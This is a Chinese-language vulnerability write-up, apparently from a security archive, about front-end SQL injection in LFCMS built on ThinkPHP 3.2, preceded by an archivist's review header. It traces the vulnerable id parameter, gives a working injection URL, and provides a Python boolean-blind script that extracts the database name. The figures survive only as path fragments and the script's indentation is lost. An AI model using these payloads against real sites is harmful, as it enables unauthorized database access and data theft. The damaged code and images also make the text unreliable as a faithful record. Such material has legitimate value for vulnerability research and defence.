---
source: "白阁文库 BaizeSec/bylibrary"
product: "LFCMS / ThinkPHP3.2"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "LFCMS前台sql注入（一）"
prerequisites: "来源所述条件，未列明部分仍待核：News.index数组id可控，存在实验文章"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-14cec837c02f9f9c67c773f3"
entity_id: "ve-14cec837c02f9f9c67c773f3"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：News.index数组id可控，存在实验文章

- **代码与转录边界（1）**：与245同文，七张图全剩/path.png)纯文字残片，Python所有循环缩进丢失。相应原代码作为存在此问题的历史样本保留，不能直接当作可运行、成功复现的 PoC；缺失内容需回原稿核对，不据此补造可执行攻击链。

- **事实待核（2）**：缺CMS具体版本；tttest固定实验判据不能通用。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# LFCMS前台sql注入（一）

### 一、漏洞简介 ###

### 二、漏洞影响 ###

### 三、复现过程 ###

漏洞起始点位于/Application/Home/Controller/NewsController.class.php中的index方法，代码如下
/TzJ74lFNKmtjurv.png)
在代码第六行调用了News模型中的detail方法，跟进该方法
/kMGtey315nKcY9f.png)
可以看到在第八行进而调用了tp的find方法，在该版本中find方法是可以进行注入的，同时参数$id是我们可控的，首先我们来看一下正常的输入情况(图中域名为本地搭建解析)
/FQqP2YrzCc6inag.png)

根据tp3.2的注入点构造一下语句，访问如下链接

    http://lfcms.com/index.php/Home/News/index/?id[alias]=where id=1 and 1--
页面与正常访问相比没有变化，查看一下数据库日志，看下后端数据库语句
/OuVPDIbdgk7Zfja.png)

可以看到在id处已经可以进行sql语句的拼接，也就证明该处是存在可利用的注入点的，由于本套程序对于错误信息是有屏蔽的，在这里我们很难利用报错注入带出数据，在该处可以考虑使用布尔类型的盲注，两种回显状态如下
/J8eYIvElUjLXsku.png)
/OVqDUbNIlydY3w7.png)
接着写一下脚本（以查询数据库名为例）
    
    import requests
    url = 'http://lfcms.com/index.php/Home/News/index/?id[alias]=where id=1 and '
    result = ''
    for i in range(1,50):
    print('-----------------------------')
    for j in range(32,127):
    payload = 'if((ascii(substr((select database()),{},1))={}),1,0)--'.format(i,j)
    temp = url+payload
    try:
    html = requests.get(temp,timeout=10)
    if 'tttest' in html.text:
    result+=chr(j)
    print(result)
    break
    except:
    print('[-]error')
结果如下
/vRt2Zxjw4N3ubl7.png)
相同原理的利用点还有很多，如位于/Application/Home/Controller/MovieController.class.php中的index方法的id参数，这里就不再重复分析了

### 参考链接 ###
https://xz.aliyun.com/t/7844


---

> 来源：白阁文库 BaizeSec/bylibrary
